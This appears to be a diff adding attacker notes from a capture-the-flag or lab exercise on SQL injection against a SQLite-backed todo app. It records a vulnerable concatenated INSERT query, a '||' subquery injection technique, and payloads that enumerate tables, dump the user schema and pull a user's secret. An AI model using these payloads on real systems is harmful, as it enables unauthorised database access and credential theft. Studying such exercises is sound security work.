@@ -1,0 +1,26 @@
+
+500 error:
+'2
+
+filtered: *-/
+
+'insert into todos (name) values (\'' + name + '\')'
+insert into todos (name) values ('' + 'hey' + '') -> 0
+insert into todos (name) values ('a' || 'x' || 'b') -> 'axb'
+insert into todos (name) values ('a' || (select 'x') || 'b') -> 'axb'
+
+' || () || '
+
+> select sqlite_version()
+3.22.0
+
+> select group_concat(tbl_name) from sqlite_master
+user,user,todo
+
+> select sql from sqlite_master where tbl_name = 'user'
+
+CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(64), name
+VARCHAR(128), password_hash VARCHAR(128), secret VARCHAR(128), admin INTEGER,
+PRIMARY KEY (id) )
+
+> select secret from user where name = 'Agent 513'
